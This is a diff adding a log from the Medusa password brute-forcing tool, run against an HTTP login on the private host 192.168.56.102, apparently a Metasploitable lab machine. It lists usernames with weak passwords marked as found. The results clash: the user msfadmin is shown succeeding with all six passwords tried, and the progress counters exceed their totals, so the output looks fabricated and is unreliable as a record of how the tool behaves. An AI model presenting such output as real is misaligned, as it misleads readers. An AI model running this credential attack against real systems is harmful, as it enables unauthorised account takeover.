@@ -1,0 +1,25 @@
+Medusa v2.3 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>
+
+GENERAL: Parallel Hosts: 1 Parallel Logins: 6
+GENERAL: Total Hosts: 1 
+GENERAL: Total Users: 4
+GENERAL: Total Passwords: 6
+2026-11-25 16:42:12 ACCOUNT CHECK: [http] Host: 192.168.56.102 (1 of 1, 0 complete) User: msfadmin (1 of 4, 0 complete) Password: qwerty (1 of 6 complete)
+2026-11-25 16:42:12 ACCOUNT FOUND: [http] Host: 192.168.56.102 User: msfadmin Password: qwerty [SUCCESS]
+2026-11-25 16:42:12 ACCOUNT CHECK: [http] Host: 192.168.56.102 (1 of 1, 0 complete) User: user (2 of 4, 1 complete) Password: msfadmin (1 of 6 complete)
+2026-11-25 16:42:12 ACCOUNT FOUND: [http] Host: 192.168.56.102 User: user Password: msfadmin [SUCCESS]
+2026-11-25 16:42:12 ACCOUNT CHECK: [http] Host: 192.168.56.102 (1 of 1, 0 complete) User: admin (3 of 4, 2 complete) Password: msfadmin (1 of 6 complete)
+2026-11-25 16:42:12 ACCOUNT FOUND: [http] Host: 192.168.56.102 User: admin Password: msfadmin [SUCCESS]
+2026-11-25 16:42:12 ACCOUNT CHECK: [http] Host: 192.168.56.102 (1 of 1, 0 complete) User: root (4 of 4, 3 complete) Password: msfadmin (1 of 6 complete)
+2026-11-25 16:42:12 ACCOUNT FOUND: [http] Host: 192.168.56.102 User: root Password: msfadmin [SUCCESS]
+2026-11-25 16:42:12 ACCOUNT CHECK: [http] Host: 192.168.56.102 (1 of 1, 0 complete) User: msfadmin (1 of 4, 4 complete) Password: password (2 of 6 complete)
+2026-11-25 16:42:12 ACCOUNT FOUND: [http] Host: 192.168.56.102 User: msfadmin Password: password [SUCCESS]
+2026-11-25 16:42:12 ACCOUNT CHECK: [http] Host: 192.168.56.102 (1 of 1, 0 complete) User: msfadmin (1 of 4, 5 complete) Password: 123456 (3 of 6 complete)
+2026-11-25 16:42:12 ACCOUNT FOUND: [http] Host: 192.168.56.102 User: msfadmin Password: 123456 [SUCCESS]
+2026-11-25 16:42:13 ACCOUNT CHECK: [http] Host: 192.168.56.102 (1 of 1, 0 complete) User: msfadmin (1 of 4, 6 complete) Password: user (4 of 6 complete)
+2026-11-25 16:42:13 ACCOUNT FOUND: [http] Host: 192.168.56.102 User: msfadmin Password: user [SUCCESS]
+2026-11-25 16:42:13 ACCOUNT CHECK: [http] Host: 192.168.56.102 (1 of 1, 0 complete) User: msfadmin (1 of 4, 7 complete) Password: msfadmin (5 of 6 complete)
+2026-11-25 16:42:13 ACCOUNT FOUND: [http] Host: 192.168.56.102 User: msfadmin Password: msfadmin [SUCCESS]
+2026-11-25 16:42:13 ACCOUNT CHECK: [http] Host: 192.168.56.102 (1 of 1, 0 complete) User: msfadmin (1 of 4, 8 complete) Password: admin (6 of 6 complete)
+2026-11-25 16:42:13 ACCOUNT FOUND: [http] Host: 192.168.56.102 User: msfadmin Password: admin [SUCCESS]
+GENERAL: Medusa has finished.
